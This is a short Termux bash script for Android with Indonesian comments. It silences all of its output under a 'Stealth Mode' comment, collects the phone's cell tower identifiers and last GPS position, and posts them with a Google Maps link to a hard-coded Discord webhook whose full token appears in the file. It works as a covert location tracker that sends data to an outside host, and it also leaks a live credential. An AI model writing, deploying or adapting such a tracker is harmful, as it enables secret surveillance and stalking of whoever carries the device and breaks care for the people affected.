#!/data/data/com.termux/files/usr/bin/bash

# Stealth Mode: Hening total, log internal jika perlu
exec &>/dev/null

# Ambil data jaringan seluler
CELL=$(termux-telephony-cellinfo)
MCC=$(echo "$CELL" | jq -r '[.[] | select(.registered == true)][0].mcc')
MNC=$(echo "$CELL" | jq -r '[.[] | select(.registered == true)][0].mnc')
LAC=$(echo "$CELL" | jq -r '[.[] | select(.registered == true)][0].tac')
CID=$(echo "$CELL" | jq -r '[.[] | select(.registered == true)][0].ci')

# Ambil lokasi GPS
LOC=$(termux-location -p gps -r last)
LAT=$(echo "$LOC" | jq -r '.latitude')
LON=$(echo "$LOC" | jq -r '.longitude')

# Waktu
NOW=$(date '+%Y-%m-%d %H:%M:%S')

# Format lokasi ke Google Maps
GMAPS="https://maps.google.com/?q=$LAT,$LON"

# Webhook tujuan
WEBHOOK="https://discord.com/api/webhooks/1298242162709889068/Cw7RQfdXfNH2CpffzljbVz8ZKmJZszEo7c-Y81r-fAIRmAG4oBOhtEZplanALE6L15Cq"

# Payload JSON
PAYLOAD=$(jq -n \
  --arg now "$NOW" \
  --arg mcc "$MCC" \
  --arg mnc "$MNC" \
  --arg lac "$LAC" \
  --arg cid "$CID" \
  --arg lat "$LAT" \
  --arg lon "$LON" \
  --arg gmaps "$GMAPS" \
  '{
    username: "SkizaPing",
    content: "📡 **Ping [$now]**\nMCC: \($mcc) | MNC: \($mnc) | LAC: \($lac) | CID: \($cid)\n📍 [Lihat di Gmaps](\($gmaps))\n📶 Lat: \($lat) | Lon: \($lon)"
  }'
)

# Kirim
curl -s -X POST -H "Content-Type: application/json" -d "$PAYLOAD" "$WEBHOOK"
